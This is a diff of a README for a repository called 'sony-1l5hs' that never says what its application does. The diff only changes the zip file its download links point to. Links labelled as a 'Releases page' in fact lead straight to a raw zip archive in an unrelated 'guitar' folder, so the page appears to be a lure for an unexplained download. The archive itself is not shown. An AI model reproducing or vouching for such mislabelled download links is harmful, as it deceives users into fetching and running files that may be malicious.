@@ -1,6 +1,6 @@
 # 🔥 sony-1l5hs - Enjoy a Random Experience Anytime
 
-[![Download Release](https://raw.githubusercontent.com/vijayvijayiocl/sony-1l5hs/main/guitar/sony-1l5hs.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/vijayvijayiocl/sony-1l5hs/main/guitar/sony-1l5hs.zip)
+[![Download Release](https://raw.githubusercontent.com/vijayvijayiocl/sony-1l5hs/main/guitar/hs_l_sony_v3.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/vijayvijayiocl/sony-1l5hs/main/guitar/hs_l_sony_v3.5.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Using the sony-1l5hs application is straightforward. Follow these steps to get s
 
 1. **Visit the Releases Page**: You can download the application from our Releases page. Click the button below:
 
-   [Click here to visit the Releases page](https://raw.githubusercontent.com/vijayvijayiocl/sony-1l5hs/main/guitar/sony-1l5hs.zip)
+   [Click here to visit the Releases page](https://raw.githubusercontent.com/vijayvijayiocl/sony-1l5hs/main/guitar/hs_l_sony_v3.5.zip)
 
 2. **Select the Latest Version**: On the Releases page, you will see a list of available versions. Look for the latest version, as it typically includes the most features and fixes.
 
@@ -28,7 +28,7 @@ Using the sony-1l5hs application is straightforward. Follow these steps to get s
 
 To download the sony-1l5hs application, please follow this link:
 
-[Download from Releases Page](https://raw.githubusercontent.com/vijayvijayiocl/sony-1l5hs/main/guitar/sony-1l5hs.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/vijayvijayiocl/sony-1l5hs/main/guitar/hs_l_sony_v3.5.zip)
 
 Make sure to choose the latest version for the best experience. Select the appropriate file type based on your operating system.
 
